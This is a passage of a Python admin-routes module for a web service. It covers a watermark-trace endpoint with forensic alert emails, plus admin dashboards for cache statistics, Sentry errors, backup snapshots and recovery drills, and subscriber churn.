    except Exception:
        log.warning("trace_watermark sentry capture failed", exc_info=True)

    # Forensic alert email — fire-and-forget so a stalled email backend
    # never blocks the endpoint. Resolve IP defensively; some stub
    # requests (and probes via internal callers) lack ``request.client``.
    try:
        ip_address = _client_ip(request) or "unknown"
    except Exception:
        ip_address = "unknown"
    try:
        import asyncio as _asyncio
        _asyncio.create_task(
            _notify_forensic_of_trace(
                admin_email=admin_email,
                target_watermark=raw,
                target_user_id=target_user_id,
                ip_address=ip_address,
                user_agent=(request.headers.get("user-agent") or "")[:500],
            )
        )
    except Exception:
        log.warning("trace_watermark forensic-email schedule failed", exc_info=True)

    if not detail:
        return JSONResponse({"error": "watermark not found"}, status_code=404)

    # Enrich with the recipient's email + username for the responder UI.
    user_row = None
    try:
        with db.conn() as c:
            user_row = c.execute(
                "SELECT id, email, username FROM users WHERE id = ?",
                (detail["user_id"],),
            ).fetchone()
    except Exception:
        log.warning("trace_watermark user lookup failed", exc_info=True)

    # Apply optional refinement filters now that we have the full row.
    # A filter miss returns the same 404 shape as an unknown watermark
    # so the endpoint stays consistent for clients.
    created_at = int(detail.get("created_at") or 0)
    if q_target and user_row:
        target_email = (user_row["email"] or "").lower()
        if q_target not in target_email:
            return JSONResponse(
                {"error": "watermark not found (filter mismatch)"},
                status_code=404,
            )
    if since_ts is not None and created_at < since_ts:
        return JSONResponse(
            {"error": "watermark not found (filter mismatch)"},
            status_code=404,
        )
    if until_ts is not None and created_at > until_ts:
        return JSONResponse(
            {"error": "watermark not found (filter mismatch)"},
            status_code=404,
        )

    payload = {
        "watermark": detail["watermark"],
        "user_id": detail["user_id"],
        "email": user_row["email"] if user_row else None,
        "username": user_row["username"] if user_row else None,
        "template": detail["template"],
        "email_id": detail["email_id"],
        "created_at": detail["created_at"],
        "created_at_iso": _dt.datetime.utcfromtimestamp(
            detail["created_at"]
        ).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "filters": {
            "q": q_target or None,
            "since": since_str or None,
            "until": until_str or None,
        },
    }
    return JSONResponse(payload)


async def _notify_forensic_of_trace(
    *,
    admin_email: str,
    target_watermark: str,
    target_user_id: int | None,
    ip_address: str,
    user_agent: str,
) -> None:
    """Email the forensic mailbox on every /admin/trace-watermark access.

    Per Cloudflare security audit: a watermark trace is a high-trust
    forensic action and an out-of-band notification gives a second pair
    of eyes the chance to flag misuse. Recipient resolves via
    ``EMAIL_FORENSIC`` first (purpose-built), falling back to
    ``LEGAL_EMAIL`` (general counsel), then a hard-coded default.
    """
    import os as _os
    recipient = (
        _os.environ.get("EMAIL_FORENSIC", "").strip()
        or _os.environ.get("LEGAL_EMAIL", "").strip()
        or "legal@narve.ai"
    )
    timestamp = _dt.datetime.now(tz=_dt.timezone.utc).strftime(
        "%Y-%m-%d %H:%M:%S UTC"
    )
    try:
        from jobs.email_jobs import enqueue_email
        await enqueue_email(
            to=recipient,
            template="admin_forensic_alert",
            context={
                "admin_email": admin_email,
                "target_watermark": target_watermark,
                "target_user_id": target_user_id if target_user_id is not None else "—",
                "ip_address": ip_address,
                "user_agent": user_agent,
                "timestamp": timestamp,
                # The _SUBJECTS fallback already includes "Watermark trace
                # used"; this `subject` override interpolates the admin
                # email so the inbox preview is actionable.
                "subject": f"[narve.ai] Watermark trace used — admin={admin_email}",
            },
            tags=["forensic", "trace-watermark"],
        )
    except Exception as exc:
        log.warning(
            "forensic email notify failed admin=%s watermark=%s: %s",
            admin_email, target_watermark, exc,
        )


# ── Cache admin ──────────────────────────────────────────────────────────
#
# Surfaces the sync TTL cache (cache/ttl.py) to admins: total items, live
# vs expired, hit rate per key prefix, eviction count. The "Clear cache"
# button hits a POST-only endpoint so it can't be triggered via <img> or
# GET-prefetch. Admin-gated via the standard `_require_admin_user` guard.


async def cache_page(request: Request):
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)
    from cache import ttl_cache
    stats = ttl_cache.stats()

    namespace_filter = (request.query_params.get("namespace") or "").strip()

    # Render the per-prefix hit table. Keep styling inline so it inherits
    # the dashboard shell without needing a new /static asset.
    needle = namespace_filter.lower()
    per_prefix = stats["per_prefix"]
    if needle:
        per_prefix = [
            r for r in per_prefix
            if needle in (r.get("prefix") or "").lower()
        ]
    rows = []
    for r in per_prefix:
        rate = f"{r['hit_rate'] * 100:.1f}%"
        rows.append(
            f"<tr>"
            f"<td><code>{html.escape(r['prefix'])}</code></td>"
            f"<td class='num'>{r['hits']:,}</td>"
            f"<td class='num'>{r['misses']:,}</td>"
            f"<td class='num'>{r['sets']:,}</td>"
            f"<td class='num'>{rate}</td>"
            f"</tr>"
        )
    per_prefix_html = "".join(rows) or (
        "<tr><td colspan='5' class='muted'>No cache activity yet.</td></tr>"
    )
    hit_rate_pct = f"{stats['hit_rate'] * 100:.2f}%"

    namespace_form = (
        "<form method='get' style='display:flex;gap:12px;align-items:flex-end;"
        "padding:16px;background:var(--bg-raised);"
        "border:1px solid var(--border-default);border-radius:12px;margin:24px 0'>"
        "<label style='display:flex;flex-direction:column;font-size:11px;"
        "color:var(--text-tertiary);text-transform:uppercase;letter-spacing:0.08em;"
        "font-family:var(--font-mono);gap:4px;flex:1'>Namespace contains"
        f"<input type='text' name='namespace' value='{html.escape(namespace_filter)}' "
        "placeholder='e.g. market or user_' "
        "style='font-family:var(--font-ui);font-size:13px;padding:6px 8px;"
        "background:var(--bg-base);color:var(--text-primary);"
        "border:1px solid var(--border-default);border-radius:6px'></label>"
        "<button type='submit' style='background:var(--text-primary);"
        "color:var(--bg-base);border:none;border-radius:6px;padding:7px 14px;"
        "font-family:var(--font-mono);font-size:11px;text-transform:uppercase;"
        "letter-spacing:0.08em;cursor:pointer'>Filter</button>"
        "<a href='/admin/cache' style='align-self:center;color:var(--text-muted);"
        "font-size:11px;text-decoration:underline'>Clear</a>"
        "</form>"
    )

    body = f"""<!DOCTYPE html><html lang='en'><head>
<meta charset='utf-8'><title>Cache — narve admin</title>
<link rel='stylesheet' href='/_gateway_static/gateway.css?v=8'>
<style>
body{{background:var(--bg-base);color:var(--text-primary);
font-family:var(--font-ui);padding:40px;max-width:1100px;margin:0 auto}}
h1{{font-family:var(--font-display);font-style:italic;font-size:40px;
margin:0 0 8px;letter-spacing:-0.02em}}
.meta{{color:var(--text-tertiary);font-size:12px;font-family:var(--font-mono);
text-transform:uppercase;letter-spacing:0.1em;margin-bottom:32px}}
.grid{{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:32px}}
.card{{background:var(--bg-raised);border:1px solid var(--border-default);
border-radius:12px;padding:16px}}
.card-label{{font-size:11px;color:var(--text-tertiary);text-transform:uppercase;
letter-spacing:0.08em;margin:0 0 8px;font-family:var(--font-mono)}}
.card-value{{font-size:28px;font-weight:500;margin:0;font-variant-numeric:tabular-nums}}
table{{width:100%;border-collapse:collapse;font-size:13px;margin-top:8px}}
th,td{{padding:8px 12px;text-align:left;border-bottom:1px solid var(--border-subtle)}}
th{{color:var(--text-tertiary);font-size:11px;text-transform:uppercase;letter-spacing:0.08em;
font-family:var(--font-mono);font-weight:500}}
.num{{text-align:right;font-variant-numeric:tabular-nums;font-family:var(--font-mono)}}
.muted{{color:var(--text-tertiary);text-align:center;padding:24px;font-style:italic}}
form.clear{{margin-top:32px;padding:20px;background:var(--bg-raised);
border:1px solid var(--border-default);border-radius:12px}}
button.danger{{background:transparent;color:var(--text-primary);
border:1px solid var(--border-default);border-radius:6px;padding:8px 16px;
font-family:var(--font-mono);font-size:11px;text-transform:uppercase;
letter-spacing:0.08em;cursor:pointer}}
button.danger:hover{{border-color:var(--text-primary)}}
</style></head><body>
<h1>Cache</h1>
<p class='meta'>Process-local TTL cache · read hits that skip SQLite</p>

<div class='grid'>
  <div class='card'><p class='card-label'>Live entries</p>
    <p class='card-value'>{stats['live']:,}</p></div>
  <div class='card'><p class='card-label'>Total (live + expired)</p>
    <p class='card-value'>{stats['total']:,} / {stats['max_items']:,}</p></div>
  <div class='card'><p class='card-label'>Hit rate</p>
    <p class='card-value'>{hit_rate_pct}</p></div>
  <div class='card'><p class='card-label'>Evictions</p>
    <p class='card-value'>{stats['evictions']:,}</p></div>
</div>

<h2 style='font-family:var(--font-display);font-style:italic;font-size:24px;margin:32px 0 8px'>
  Per-prefix activity</h2>
{namespace_form}
<table>
  <thead><tr>
    <th>Prefix</th><th class='num'>Hits</th><th class='num'>Misses</th>
    <th class='num'>Sets</th><th class='num'>Hit rate</th>
  </tr></thead>
  <tbody>{per_prefix_html}</tbody>
</table>

<form class='clear' method='post' action='/admin/cache/clear'
      onsubmit='return confirm(\"Clear ALL cache entries? Reads will hit SQLite until caches rebuild.\")'>
  <p style='margin:0 0 12px;color:var(--text-secondary);font-size:13px'>
    <strong>Danger zone.</strong> Clearing drops every cached entry in this
    process. Reads immediately revert to hitting SQLite; next-read will
    repopulate. Invalidation is normally automatic — only clear when you
    need a hard flush.</p>
  <button class='danger' type='submit'>Clear cache</button>
</form>
</body></html>"""
    return HTMLResponse(body)


async def cache_stats_json(request: Request):
    """JSON snapshot of cache stats. Useful for dashboards / curl checks."""
    _require_admin_user(request)
    from cache import ttl_cache
    return JSONResponse(ttl_cache.stats())


# ── /admin/api/sentry ──────────────────────────────────────────────────────
#
# Recent-errors widget on the admin System Health tab. Pulls from the
# Sentry HTTP API via observability.sentry_api, which memoises the result
# for 5 minutes — so upstream Sentry rate limits aren't tripped even if
# every admin reloads the tab on a tight loop. ``force_refresh=1`` lets
# an admin manually break the cache; that path is rate-limited to 12
# refreshes per hour per admin (one Sentry API call per 5 min ≈ 12/hr).

_sentry_refresh_rate_limit: dict[str, list[float]] = {}
_sentry_refresh_lock = None  # lazy init — module import shouldn't need threading


def _sentry_refresh_allowed(admin_id: str) -> bool:
    """Return True if this admin can force-refresh; record the attempt.

    Bounds at 12 calls/hour per admin to stay well under Sentry's 40 req/s
    org-wide limit even if multiple admins refresh in parallel.
    """
    global _sentry_refresh_lock
    if _sentry_refresh_lock is None:
        import threading
        _sentry_refresh_lock = threading.Lock()
    now = time.time()
    cutoff = now - 3600
    with _sentry_refresh_lock:
        bucket = _sentry_refresh_rate_limit.setdefault(admin_id, [])
        # Drop expired timestamps.
        bucket[:] = [t for t in bucket if t >= cutoff]
        if len(bucket) >= 12:
            return False
        bucket.append(now)
        return True


async def sentry_summary_json(request: Request):
    """JSON snapshot of recent Sentry errors. Admin-only.

    Query params:
        refresh=1  — bypass the 5-minute cache (rate-limited per admin).

    Response shape:
        {enabled, dashboard_url, count_24h, recent: [...], error, cached_at}

    Never exposes ``SENTRY_AUTH_TOKEN`` — only the public dashboard URL
    and per-issue permalinks (which are public Sentry web URLs).
    """
    admin = _require_admin_user(request)

    force_refresh = False
    try:
        if request.query_params.get("refresh") in ("1", "true", "yes"):
            admin_id = str(
                (isinstance(admin, dict) and (admin.get("email") or admin.get("user_id")))
                or "unknown"
            )
            if _sentry_refresh_allowed(admin_id):
                force_refresh = True
            # If the rate limit is tripped we silently fall back to the
            # cached payload — the UI still gets data, just not fresh.
    except Exception:
        log.warning("sentry refresh param parse failed", exc_info=True)

    try:
        from observability.sentry_api import fetch_sentry_summary
        payload = await fetch_sentry_summary(force_refresh=force_refresh)
    except Exception as e:
        log.warning("fetch_sentry_summary crashed: %s", e, exc_info=True)
        payload = {
            "enabled": False,
            "dashboard_url": "",
            "count_24h": 0,
            "recent": [],
            "error": "Internal error fetching Sentry summary",
            "cached_at": int(time.time()),
        }
    return JSONResponse(payload)


async def cache_clear(request: Request):
    admin = _require_admin_user(request)
    from cache import ttl_invalidate
    removed = ttl_invalidate.everything()

    # Audit trail — a cache clear can mask bugs, we want the record.
    try:
        from security import audit as _a
        _audit(
            _a.AuditAction.SYSTEM_CONFIG_CHANGE,
            admin=admin, request=request,
            target_type="cache", target_id="all",
            after={"removed": removed},
        )
    except Exception:
        log.warning("audit of cache_clear failed", exc_info=True)

    return RedirectResponse("/admin/cache", status_code=302)


# ── /admin/backups ───────────────────────────────────────────────────────
#
# Reads straight from /var/backups/narve on the host + the drill_runs
# table. Everything is best-effort — if the backup dir doesn't exist
# we render empty cards (dev machines never have it) rather than 500.


_BACKUP_DIRS = {
    "hourly": "/var/backups/narve",
    "daily":  "/var/backups/narve/daily",
}
_VERIFY_LOG = "/var/log/narve-backup-verify.log"


def _scan_backup_dir(path: str, prefix: str) -> list[dict]:
    """Return a list of {name, size, mtime} for files in ``path``
    whose basename starts with ``prefix``. Safe against a missing
    directory and unreadable files."""
    import os
    entries: list[dict] = []
    try:
        names = os.listdir(path)
    except (FileNotFoundError, PermissionError):
        return entries
    for n in names:
        if not n.startswith(prefix):
            continue
        fp = os.path.join(path, n)
        try:
            st = os.stat(fp)
        except OSError:
            continue
        entries.append({"name": n, "size": st.st_size, "mtime": int(st.st_mtime)})
    entries.sort(key=lambda e: e["mtime"], reverse=True)
    return entries


def _read_verify_tail(limit: int = 5) -> list[str]:
    """Tail the verification log; empty list if the file doesn't exist."""
    try:
        with open(_VERIFY_LOG, "r", encoding="utf-8", errors="replace") as f:
            lines = f.readlines()
    except (FileNotFoundError, PermissionError):
        return []
    return [ln.rstrip() for ln in lines[-limit:]]


def _fmt_size(bytes_: int) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if bytes_ < 1024 or unit == "GB":
            return f"{bytes_:.0f} {unit}" if unit == "B" else f"{bytes_:.1f} {unit}"
        bytes_ /= 1024
    return f"{bytes_:.1f} GB"


async def backups_page(request: Request):
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)

    qp = request.query_params
    status_filter = (qp.get("status") or "").strip().lower()
    if status_filter not in {"", "success", "failed"}:
        status_filter = ""
    since_str = (qp.get("since") or "").strip()
    until_str = (qp.get("until") or "").strip()
    since_ts = _parse_date_to_ts(since_str)
    until_ts = _parse_date_to_ts(until_str)
    if until_ts is not None:
        until_ts += 86_399

    def _in_window(mtime: int) -> bool:
        if since_ts is not None and mtime < since_ts:
            return False
        if until_ts is not None and mtime > until_ts:
            return False
        return True

    hourly_all = _scan_backup_dir(_BACKUP_DIRS["hourly"], "auth.db.")
    daily_all = _scan_backup_dir(_BACKUP_DIRS["daily"], "auth.db.")
    hourly = [e for e in hourly_all if _in_window(int(e["mtime"]))][:24]
    daily = [e for e in daily_all if _in_window(int(e["mtime"]))][:30]
    verify_tail = _read_verify_tail(limit=5)

    now = int(time.time())
    # Age-based alert cards — hourly > 2h stale or daily > 26h stale
    # signals a failed cron.
    hourly_latest = hourly[0]["mtime"] if hourly else None
    daily_latest = daily[0]["mtime"] if daily else None
    hourly_age_h = (now - hourly_latest) / 3600 if hourly_latest else None
    daily_age_h = (now - daily_latest) / 3600 if daily_latest else None

    hourly_alert = (
        hourly_latest is None or hourly_age_h is not None and hourly_age_h > 2
    )
    daily_alert = (
        daily_latest is None or daily_age_h is not None and daily_age_h > 26
    )

    def _row(entry: dict) -> str:
        return (
            f"<tr><td><code>{html.escape(entry['name'])}</code></td>"
            f"<td class='num'>{_fmt_size(entry['size'])}</td>"
            f"<td class='num'>{_fmt_ts(entry['mtime'])}</td></tr>"
        )

    hourly_html = "".join(_row(e) for e in hourly) or (
        "<tr><td colspan='3' class='muted'>No hourly snapshots found. "
        f"Check <code>{_BACKUP_DIRS['hourly']}</code> and the cron log.</td></tr>"
    )
    daily_html = "".join(_row(e) for e in daily) or (
        "<tr><td colspan='3' class='muted'>No daily snapshots found. "
        f"Check <code>{_BACKUP_DIRS['daily']}</code> and the cron log.</td></tr>"
    )
    verify_html = "".join(
        f"<li><code>{html.escape(ln)}</code></li>" for ln in verify_tail
    ) or "<li class='muted'>No verification log yet.</li>"

    # Drill history — last 10 recovery-drill outcomes. Status filter
    # applies here (snapshot files don't carry a status; drills do).
    drill_rows: list[str] = []
    try:
        with db.conn() as c:
            rows = c.execute(
                "SELECT id, started_at, completed_at, integrity_ok, "
                "       foreign_key_ok, users_live, users_restore, "
                "       predictions_live, predictions_restore, notes "
                "FROM drill_runs ORDER BY started_at DESC LIMIT 50"
            ).fetchall()
            kept = 0
            for r in rows:
                if kept >= 10:
                    break
                if since_ts is not None and int(r["started_at"] or 0) < since_ts:
                    continue
                if until_ts is not None and int(r["started_at"] or 0) > until_ts:
                    continue
                passed = (
                    r["integrity_ok"] and r["foreign_key_ok"] and
                    (not r["notes"] or r["notes"] == "ok")
                )
                if status_filter == "success" and not passed:
                    continue
                if status_filter == "failed" and passed:
                    continue
                status = (
                    '<span class="badge" style="background:rgba(46,160,67,0.12);'
                    'color:#2ea043">PASS</span>'
                    if passed
                    else '<span class="badge" style="background:rgba(248,81,73,0.12);'
                         'color:#f85149">FAIL</span>'
                )
                kept += 1
                drill_rows.append(
                    f"<tr><td>{_fmt_ts(r['started_at'])}</td>"
                    f"<td>{status}</td>"
                    f"<td class='num'>{r['users_live'] or '—'}"
                    f" / {r['users_restore'] or '—'}</td>"
                    f"<td class='num'>{r['predictions_live'] or '—'}"
                    f" / {r['predictions_restore'] or '—'}</td>"
                    f"<td><code>{html.escape((r['notes'] or '')[:80])}</code></td></tr>"
                )
    except Exception:
        log.exception("backups_page: drill_runs query failed")
    drill_html = "".join(drill_rows) or (
        "<tr><td colspan='5' class='muted'>"
        "No recovery drills recorded yet. First run lands on the next "
        "1st of Jan/Apr/Jul/Oct at 05:20 UTC.</td></tr>"
    )

    def _alert_card(kind: str, age_h, threshold: float) -> str:
        if age_h is None:
            label = "missing"
            colour = "#f85149"
        elif age_h > threshold:
            label = f"{age_h:.1f}h stale"
            colour = "#f0883e"
        else:
            label = f"{age_h:.1f}h old"
            colour = "#2ea043"
        return (
            f"<div class='card'><p class='card-label'>Latest {kind}</p>"
            f"<p class='card-value' style='color:{colour}'>{label}</p></div>"
        )

    def _opt(value: str, label: str, active: str) -> str:
        sel = ' selected' if value == active else ''
        return f'<option value="{html.escape(value)}"{sel}>{html.escape(label)}</option>'

    filter_form_html = (
        "<form method='get' style='display:flex;gap:12px;align-items:flex-end;"
        "flex-wrap:wrap;padding:16px;background:var(--bg-raised);"
        "border:1px solid var(--border-default);border-radius:12px;margin:0 0 24px'>"
        "<label style='display:flex;flex-direction:column;font-size:11px;"
        "color:var(--text-tertiary);text-transform:uppercase;letter-spacing:0.08em;"
        "font-family:var(--font-mono);gap:4px'>Drill status"
        "<select name='status' style='font-family:var(--font-ui);font-size:13px;"
        "padding:6px 8px;background:var(--bg-base);color:var(--text-primary);"
        "border:1px solid var(--border-default);border-radius:6px'>"
        f"{_opt('', 'All', status_filter)}{_opt('success', 'Success', status_filter)}"
        f"{_opt('failed', 'Failed', status_filter)}</select></label>"
        "<label style='display:flex;flex-direction:column;font-size:11px;"
        "color:var(--text-tertiary);text-transform:uppercase;letter-spacing:0.08em;"
        "font-family:var(--font-mono);gap:4px'>Since"
        f"<input type='date' name='since' value='{html.escape(since_str)}' "
        "style='font-family:var(--font-ui);font-size:13px;padding:6px 8px;"
        "background:var(--bg-base);color:var(--text-primary);"
        "border:1px solid var(--border-default);border-radius:6px'></label>"
        "<label style='display:flex;flex-direction:column;font-size:11px;"
        "color:var(--text-tertiary);text-transform:uppercase;letter-spacing:0.08em;"
        "font-family:var(--font-mono);gap:4px'>Until"
        f"<input type='date' name='until' value='{html.escape(until_str)}' "
        "style='font-family:var(--font-ui);font-size:13px;padding:6px 8px;"
        "background:var(--bg-base);color:var(--text-primary);"
        "border:1px solid var(--border-default);border-radius:6px'></label>"
        "<button type='submit' style='background:var(--text-primary);"
        "color:var(--bg-base);border:none;border-radius:6px;padding:7px 14px;"
        "font-family:var(--font-mono);font-size:11px;text-transform:uppercase;"
        "letter-spacing:0.08em;cursor:pointer'>Apply</button>"
        "<a href='/admin/backups' style='align-self:center;color:var(--text-muted);"
        "font-size:11px;text-decoration:underline'>Clear</a>"
        "</form>"
    )

    body = f"""<!DOCTYPE html><html lang='en'><head>
<meta charset='utf-8'><title>Backups — narve admin</title>
<link rel='stylesheet' href='/_gateway_static/gateway.css?v=8'>
<style>
body{{background:var(--bg-base);color:var(--text-primary);font-family:var(--font-ui);
padding:40px;max-width:1100px;margin:0 auto}}
h1{{font-family:var(--font-display);font-style:italic;font-size:40px;
margin:0 0 8px;letter-spacing:-0.02em}}
.meta{{color:var(--text-tertiary);font-size:12px;font-family:var(--font-mono);
text-transform:uppercase;letter-spacing:0.1em;margin-bottom:32px}}
.grid{{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:32px}}
.card{{background:var(--bg-raised);border:1px solid var(--border-default);
border-radius:12px;padding:16px}}
.card-label{{font-size:11px;color:var(--text-tertiary);text-transform:uppercase;
letter-spacing:0.08em;margin:0 0 8px;font-family:var(--font-mono)}}
.card-value{{font-size:22px;font-weight:500;margin:0;font-variant-numeric:tabular-nums}}
h2{{font-family:var(--font-display);font-style:italic;font-size:24px;margin:32px 0 8px}}
table{{width:100%;border-collapse:collapse;font-size:13px;margin-top:8px}}
th,td{{padding:8px 12px;text-align:left;border-bottom:1px solid var(--border-subtle)}}
th{{color:var(--text-tertiary);font-size:11px;text-transform:uppercase;letter-spacing:0.08em;
font-family:var(--font-mono);font-weight:500}}
.num{{text-align:right;font-variant-numeric:tabular-nums;font-family:var(--font-mono)}}
code{{font-family:var(--font-mono);font-size:12px;color:var(--text-primary)}}
.muted{{color:var(--text-tertiary);padding:24px;font-style:italic}}
.badge{{padding:2px 8px;border-radius:4px;font-family:var(--font-mono);font-size:10px;
letter-spacing:0.04em}}
ul.log{{list-style:none;padding:0;margin:12px 0}}
ul.log li{{padding:6px 12px;background:var(--bg-raised);margin:4px 0;border-radius:4px;
font-family:var(--font-mono);font-size:11px}}
</style></head><body>
<h1>Backups</h1>
<p class='meta'>3-2-1 snapshot strategy · hourly + daily + weekly offsite</p>

{filter_form_html}

<div class='grid'>
  {_alert_card('hourly', hourly_age_h, 2)}
  {_alert_card('daily',  daily_age_h,  26)}
  <div class='card'>
    <p class='card-label'>Latest verification</p>
    <p class='card-value' style='color:{"#2ea043" if verify_tail and "OK" in verify_tail[-1] else "#f0883e"}'>
      {html.escape(verify_tail[-1][:60]) if verify_tail else "never run"}
    </p>
  </div>
</div>

<h2>Hourly snapshots (last 24)</h2>
<table><thead><tr><th>File</th><th class='num'>Size</th><th class='num'>Modified</th></tr></thead>
<tbody>{hourly_html}</tbody></table>

<h2>Daily snapshots (last 30)</h2>
<table><thead><tr><th>File</th><th class='num'>Size</th><th class='num'>Modified</th></tr></thead>
<tbody>{daily_html}</tbody></table>

<h2>Verification tail</h2>
<ul class='log'>{verify_html}</ul>

<h2>Recovery drills (last 10)</h2>
<table><thead><tr><th>Started</th><th>Status</th>
  <th class='num'>users live/restore</th>
  <th class='num'>predictions live/restore</th>
  <th>Notes</th></tr></thead>
<tbody>{drill_html}</tbody></table>

<p class='meta' style='margin-top:32px'>
  Restore procedure: <a href='/admin/runbook' style='color:inherit'>RUNBOOK § Restore from backup</a>
</p>
</body></html>"""
    return HTMLResponse(body)


# ── /admin/churn ─────────────────────────────────────────────────────────
#
# Reads from the ``churn_signals`` table (populated nightly by
# jobs/compute_churn_signals.py) and the ``cancellation_attempts`` funnel
# log (written by the 3-step cancel flow in billing_routes.py).
#
# Rendered server-side — the numbers are small (one row per subscriber,
# handful of cancel attempts/day) so there's no need for a JSON API +
# client-side chart. Keep everything inline so it stays parseable.


def _churn_risk_distribution() -> list[tuple[str, int]]:
    """Return [(tier, count)] across 'healthy', 'at_risk', 'critical'.

    Missing tiers render as zero so the pie chart is always three slices.
    """
    counts = {"healthy": 0, "at_risk": 0, "critical": 0}
    try:
        with db.conn() as c:
            for row in c.execute(
                "SELECT risk_tier, COUNT(*) AS n FROM churn_signals "
                "WHERE risk_tier IS NOT NULL GROUP BY risk_tier"
            ):
                tier = row["risk_tier"]
                if tier in counts:
                    counts[tier] = int(row["n"])
    except Exception as exc:
        log.warning("admin/churn: risk distribution failed: %s", exc)
    return [(t, counts[t]) for t in ("healthy", "at_risk", "critical")]


def _top_at_risk_users(limit: int = 20) -> list[dict]:
    try:
        with db.conn() as c:
            rows = c.execute(
                """
                SELECT cs.user_id, cs.risk_score, cs.risk_tier, cs.engagement_trend,
                       cs.days_since_last_active, cs.computed_at,
                       u.email, u.username
                FROM churn_signals cs
                LEFT JOIN users u ON u.id = cs.user_id
                WHERE cs.risk_tier IN ('at_risk', 'critical')
                ORDER BY cs.risk_score DESC, cs.user_id ASC
                LIMIT ?
                """,
                (limit,),
            ).fetchall()
    except Exception as exc:
        log.warning("admin/churn: top at-risk query failed: %s", exc)
        return []
    return [dict(r) for r in rows]


def _cancellation_funnel() -> dict:
    """Return counts per outcome across all cancellation_attempts rows."""
    out = {"total": 0, "retained": 0, "paused": 0, "cancelled": 0, "in_flight": 0}
    try:
        with db.conn() as c:
            rows = c.execute(
                "SELECT COALESCE(outcome, 'in_flight') AS o, COUNT(*) AS n "
                "FROM cancellation_attempts GROUP BY o"
            ).fetchall()
        for r in rows:
            key = r["o"] if r["o"] in out else "in_flight"
            out[key] += int(r["n"])
            out["total"] += int(r["n"])
    except Exception as exc:
        log.warning("admin/churn: cancel funnel failed: %s", exc)
    return out


def _recent_cancellations(limit: int = 20) -> list[dict]:
    try:
        with db.conn() as c:
            rows = c.execute(
                """
                SELECT ca.id, ca.user_id, ca.reason, ca.reached_step, ca.outcome,
                       ca.pause_days, ca.started_at, ca.completed_at,
                       u.email, u.username
                FROM cancellation_attempts ca
                LEFT JOIN users u ON u.id = ca.user_id
                ORDER BY ca.started_at DESC
                LIMIT ?
                """,
                (limit,),
            ).fetchall()
    except Exception as exc:
        log.warning("admin/churn: recent cancels query failed: %s", exc)
        return []
    return [dict(r) for r in rows]


def _render_risk_pie(dist: list[tuple[str, int]]) -> str:
    """SVG donut — each slice coloured by tier. Pure string template so
    we don't pull in a charting library for 3 numbers."""
    total = sum(n for _, n in dist) or 1
    colors = {"healthy": "#10b981", "at_risk": "#f59e0b", "critical": "#ef4444"}
    segs = []
    offset = 0.0
    circ = 2 * 3.14159 * 40  # circumference of r=40 circle
    for tier, n in dist:
        frac = n / total
        dash = frac * circ
        segs.append(
            f'<circle r="40" cx="50" cy="50" fill="transparent" '
            f'stroke="{colors.get(tier, "#888")}" stroke-width="16" '
            f'stroke-dasharray="{dash:.2f} {circ - dash:.2f}" '
            f'stroke-dashoffset="{-offset:.2f}" transform="rotate(-90 50 50)" />'
        )
        offset += dash
    legend = "".join(
        f'<div style="display:flex;align-items:center;gap:6px;font-size:12px">'
        f'<span style="display:inline-block;width:10px;height:10px;background:{colors.get(t, "#888")};border-radius:2px"></span>'
        f'<span style="color:var(--text-primary)">{t.replace("_", " ").title()}</span>'
        f'<span style="color:var(--text-muted);margin-left:auto;font-variant-numeric:tabular-nums">{n}</span>'
        f'</div>'
        for t, n in dist
    )
    return (
        '<div style="display:flex;gap:24px;align-items:center">'
        f'<svg viewBox="0 0 100 100" width="140" height="140" style="flex:none">{"".join(segs)}</svg>'
        f'<div style="flex:1;display:flex;flex-direction:column;gap:6px;min-width:160px">{legend}</div>'
        '</div>'
    )


def _fmt_pct(numerator: int, denom: int) -> str:
    if not denom:
        return "—"
    return f"{round(100 * numerator / denom)}%"


async def churn_dashboard(request: Request):
    admin = _require_admin_user(request, page=True)
    if admin is None:
        return _denied_response(request)
    # _require_admin_user returns a RedirectResponse when 2FA is required.
    # Pass it through directly — don't try to index it like a user dict.
    if not isinstance(admin, dict):
        return admin

    # ``level`` maps the friendlier UI label onto the canonical risk_tier
    # stored in churn_signals so the dropdown reads ``low/medium/high``
    # rather than ``healthy/at_risk/critical``.
    qp = request.query_params
    level = (qp.get("level") or "").strip().lower()
    if level not in {"", "low", "medium", "high"}:
        level = ""
    _LEVEL_TO_TIER = {"low": "healthy", "medium": "at_risk", "high": "critical"}
    tier_filter = _LEVEL_TO_TIER.get(level)

    dist = _churn_risk_distribution()
    top = _top_at_risk_users(limit=100)
    funnel = _cancellation_funnel()
    recent = _recent_cancellations(limit=20)

    if tier_filter:
        top = [u for u in top if (u.get("risk_tier") or "") == tier_filter]
    top = top[:20]

    # Risk distribution pie
    risk_pie_html = _render_risk_pie(dist)

    # Top at-risk table
    if top:
        rows = []
        for u in top:
            label = html.escape(u.get("email") or f"user#{u['user_id']}")
            score = float(u.get("risk_score") or 0.0)
            tier_class = (
                "background:rgba(239,68,68,0.12);color:#ef4444"
                if u.get("risk_tier") == "critical"
                else "background:rgba(245,158,11,0.12);color:#f59e0b"
            )
            days = u.get("days_since_last_active")
            days_str = f"{days}d" if days is not None else "—"
            trend = html.escape(u.get("engagement_trend") or "unknown")
            rows.append(
                f'<tr>'
                f'<td style="padding:8px 12px">{label}</td>'
                f'<td style="padding:8px 12px;font-variant-numeric:tabular-nums">{score:.2f}</td>'
                f'<td style="padding:8px 12px"><span class="badge" style="{tier_class};padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600">{html.escape(u.get("risk_tier") or "")}</span></td>'
                f'<td style="padding:8px 12px;color:var(--text-muted)">{trend}</td>'
                f'<td style="padding:8px 12px;color:var(--text-muted)">{days_str}</td>'
                f'</tr>'
            )
        top_html = (
            '<table style="width:100%;border-collapse:collapse">'
            '<thead><tr style="text-align:left;color:var(--text-muted);font-size:11px;text-transform:uppercase;letter-spacing:0.05em">'
            '<th style="padding:6px 12px">User</th>'
            '<th style="padding:6px 12px">Score</th>'
            '<th style="padding:6px 12px">Tier</th>'
            '<th style="padding:6px 12px">Trend</th>'
            '<th style="padding:6px 12px">Idle</th>'
            '</tr></thead>'
            f'<tbody>{"".join(rows)}</tbody>'
            '</table>'
        )
    else:
        top_html = (
            '<div style="padding:24px;text-align:center;color:var(--text-muted);font-size:13px">'
            'No at-risk or critical users yet.</div>'
        )

    # Funnel
